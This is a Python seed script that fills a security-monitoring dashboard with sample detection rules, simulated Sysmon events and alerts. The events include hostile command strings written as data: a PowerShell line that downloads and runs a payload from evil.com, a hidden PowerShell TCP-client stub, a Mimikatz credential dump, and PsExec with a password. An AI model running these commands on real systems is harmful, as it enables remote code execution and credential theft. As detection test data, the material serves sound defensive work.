"""
Seed script — populates events, alerts, and rules so the dashboard
shows live data without needing the Sysmon collector to be running.
Run from the project root:  python -m scripts.seed_dashboard
"""

from app import create_app
from database.db import db, Event, Alert, Rule
from datetime import datetime, timedelta
import random

app = create_app()

RULES_DATA = [
    dict(
        name="PowerShell Execution",
        description="Detects PowerShell process execution",
        event_type="ProcessCreate",
        conditions=[{"field": "description", "operator": "contains", "value": "powershell"}],
        severity="HIGH",
        tags=["T1059", "execution", "powershell"],
        enabled=True,
    ),
    dict(
        name="Encoded PowerShell Command",
        description="Detects base64-encoded PowerShell (common in malware)",
        event_type="ProcessCreate",
        conditions=[{"field": "description", "operator": "contains", "value": "powershell -enc"}],
        severity="CRITICAL",
        tags=["T1059", "obfuscation", "critical"],
        enabled=True,
    ),
    dict(
        name="Command Prompt Execution",
        description="Detects cmd.exe execution",
        event_type="ProcessCreate",
        conditions=[{"field": "description", "operator": "contains", "value": "cmd.exe"}],
        severity="MEDIUM",
        tags=["T1059", "execution"],
        enabled=True,
    ),
    dict(
        name="Credential Dumping — Mimikatz",
        description="Detects Mimikatz credential harvesting tool",
        event_type="ProcessCreate",
        conditions=[{"field": "description", "operator": "contains", "value": "mimikatz"}],
        severity="CRITICAL",
        tags=["T1003", "credential-access"],
        enabled=True,
    ),
    dict(
        name="PsExec Lateral Movement",
        description="Detects PsExec remote execution tool",
        event_type="ProcessCreate",
        conditions=[{"field": "description", "operator": "contains", "value": "psexec"}],
        severity="HIGH",
        tags=["T1021", "lateral-movement"],
        enabled=True,
    ),
    dict(
        name="WMI Execution",
        description="Detects WMI command execution",
        event_type="ProcessCreate",
        conditions=[{"field": "description", "operator": "contains", "value": "wmic"}],
        severity="HIGH",
        tags=["T1047", "execution", "wmi"],
        enabled=True,
    ),
    dict(
        name="Suspicious Network Connection",
        description="Detects outbound network connections from unusual processes",
        event_type="NetworkConnect",
        conditions=[{"field": "event_type", "operator": "equals", "value": "NetworkConnect"}],
        severity="MEDIUM",
        tags=["T1071", "network", "c2"],
        enabled=True,
    ),
    dict(
        name="Registry Modification",
        description="Detects registry key modifications",
        event_type="RegistryEvent",
        conditions=[{"field": "event_type", "operator": "equals", "value": "RegistryEvent"}],
        severity="LOW",
        tags=["T1112", "persistence", "registry"],
        enabled=True,
    ),
]

EVENTS_DATA = [
    # ProcessCreate events
    dict(event_id=1, event_type="ProcessCreate", computer_name="DESKTOP-SOC01",
         user="DESKTOP-SOC01\\analyst",
         description="powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\temp\\scan.ps1",
         details={"parent": "explorer.exe", "pid": 4821, "hash": "abc123"}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="DESKTOP-SOC01",
         user="DESKTOP-SOC01\\analyst",
         description="powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
         details={"parent": "cmd.exe", "pid": 5201, "hash": "def456"}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="SERVER-DC01",
         user="NT AUTHORITY\\SYSTEM",
         description="cmd.exe /c whoami & net user",
         details={"parent": "services.exe", "pid": 1032, "hash": "ghi789"}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="DESKTOP-SOC02",
         user="DESKTOP-SOC02\\jsmith",
         description="psexec.exe \\\\192.168.1.50 -u admin -p pass cmd",
         details={"parent": "explorer.exe", "pid": 7741, "hash": "jkl012"}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="SERVER-DC01",
         user="NT AUTHORITY\\SYSTEM",
         description="mimikatz.exe sekurlsa::logonpasswords",
         details={"parent": "cmd.exe", "pid": 9001, "hash": "mno345"}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="DESKTOP-SOC01",
         user="DESKTOP-SOC01\\analyst",
         description="wmic process call create calc.exe",
         details={"parent": "powershell.exe", "pid": 6612, "hash": "pqr678"}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="DESKTOP-SOC03",
         user="DESKTOP-SOC03\\mwilson",
         description="powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
         details={"parent": "winword.exe", "pid": 3344, "hash": "stu901"}),
    # NetworkConnect events
    dict(event_id=3, event_type="NetworkConnect", computer_name="DESKTOP-SOC01",
         user="DESKTOP-SOC01\\analyst",
         description="powershell.exe connecting to 185.220.101.47:443",
         details={"dest_ip": "185.220.101.47", "dest_port": 443, "protocol": "TCP"}),
    dict(event_id=3, event_type="NetworkConnect", computer_name="SERVER-DC01",
         user="NT AUTHORITY\\SYSTEM",
         description="svchost.exe connecting to 10.0.0.5:445",
         details={"dest_ip": "10.0.0.5", "dest_port": 445, "protocol": "TCP"}),
    dict(event_id=3, event_type="NetworkConnect", computer_name="DESKTOP-SOC02",
         user="DESKTOP-SOC02\\jsmith",
         description="chrome.exe connecting to 142.250.80.46:443",
         details={"dest_ip": "142.250.80.46", "dest_port": 443, "protocol": "TCP"}),
    # RegistryEvent events
    dict(event_id=12, event_type="RegistryEvent", computer_name="DESKTOP-SOC01",
         user="DESKTOP-SOC01\\analyst",
         description="Registry key set: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
         details={"key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "Updater"}),
    dict(event_id=13, event_type="RegistryEvent", computer_name="SERVER-DC01",
         user="NT AUTHORITY\\SYSTEM",
         description="Registry key modified: HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware",
         details={"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware"}),
    # FileCreate events
    dict(event_id=11, event_type="FileCreate", computer_name="DESKTOP-SOC01",
         user="DESKTOP-SOC01\\analyst",
         description="File created: C:\\Users\\analyst\\AppData\\Roaming\\update.exe",
         details={"path": "C:\\Users\\analyst\\AppData\\Roaming\\update.exe"}),
    dict(event_id=11, event_type="FileCreate", computer_name="DESKTOP-SOC03",
         user="DESKTOP-SOC03\\mwilson",
         description="File created: C:\\Windows\\Temp\\svch0st.exe",
         details={"path": "C:\\Windows\\Temp\\svch0st.exe"}),
    # More process events spread over time
    dict(event_id=1, event_type="ProcessCreate", computer_name="DESKTOP-SOC02",
         user="DESKTOP-SOC02\\jsmith",
         description="cmd.exe /c net localgroup administrators",
         details={"parent": "explorer.exe", "pid": 2233}),
    dict(event_id=1, event_type="ProcessCreate", computer_name="SERVER-DC01",
         user="NT AUTHORITY\\SYSTEM",
         description="powershell.exe -nop -w hidden -c $client = New-Object System.Net.Sockets.TCPClient",
         details={"parent": "services.exe", "pid": 8812}),
]

# Alert definitions: (event_index, rule_name, severity, status)
ALERT_MAP = [
    (0,  "PowerShell Execution",          "HIGH",     "NEW"),
    (1,  "Encoded PowerShell Command",    "CRITICAL", "OPEN"),
    (2,  "Command Prompt Execution",      "MEDIUM",   "NEW"),
    (3,  "PsExec Lateral Movement",       "HIGH",     "OPEN"),
    (4,  "Credential Dumping — Mimikatz", "CRITICAL", "NEW"),
    (5,  "WMI Execution",                 "HIGH",     "ACKNOWLEDGED"),
    (6,  "PowerShell Execution",          "HIGH",     "NEW"),
    (7,  "Suspicious Network Connection", "MEDIUM",   "NEW"),
    (10, "Registry Modification",         "LOW",      "RESOLVED"),
    (11, "Registry Modification",         "LOW",      "NEW"),
    (12, "PowerShell Execution",          "HIGH",     "NEW"),
    (15, "PowerShell Execution",          "CRITICAL", "OPEN"),
]


def seed():
    with app.app_context():
        # ── wipe existing data ──
        Alert.query.delete()
        Event.query.delete()
        Rule.query.delete()
        db.session.commit()
        print("Cleared existing data...")

        # ── seed rules ──
        rule_objects = {}
        for r in RULES_DATA:
            rule = Rule(**r)
            db.session.add(rule)
            db.session.flush()
            rule_objects[r["name"]] = rule
        db.session.commit()
        print(f"  ✓ {len(rule_objects)} rules created")

        # ── seed events spread over last 2 hours ──
        now = datetime.utcnow()
        event_objects = []
        for i, e in enumerate(EVENTS_DATA):
            # spread timestamps backwards — most recent first
            minutes_ago = i * 7 + random.randint(0, 4)
            ts = now - timedelta(minutes=minutes_ago)
            event = Event(
                event_id=e["event_id"],
                event_type=e["event_type"],
                computer_name=e["computer_name"],
                user=e["user"],
                description=e["description"],
                details=e.get("details", {}),
                timestamp=ts,
                created_at=ts,
            )
            db.session.add(event)
            db.session.flush()
            event_objects.append(event)
        db.session.commit()
        print(f"  ✓ {len(event_objects)} events created")

        # ── seed alerts ──
        alert_count = 0
        for event_idx, rule_name, severity, status in ALERT_MAP:
            if event_idx >= len(event_objects):
                continue
            event = event_objects[event_idx]
            rule  = rule_objects.get(rule_name)
            if not rule:
                continue
            alert = Alert(
                event_id=event.id,
                rule_id=rule.id,
                severity=severity,
                title=rule_name,
                description=f"Rule '{rule_name}' matched on {event.computer_name}: {event.description[:80]}",
                status=status,
                created_at=event.created_at,
                updated_at=event.created_at,
            )
            db.session.add(alert)
            alert_count += 1
        db.session.commit()
        print(f"  ✓ {alert_count} alerts created")

        # ── summary ──
        print("\nDatabase summary:")
        print(f"  Events : {Event.query.count()}")
        print(f"  Alerts : {Alert.query.count()}")
        print(f"  Rules  : {Rule.query.count()}")
        print("\nDashboard should now show real data at http://localhost:5173")


if __name__ == "__main__":
    seed()
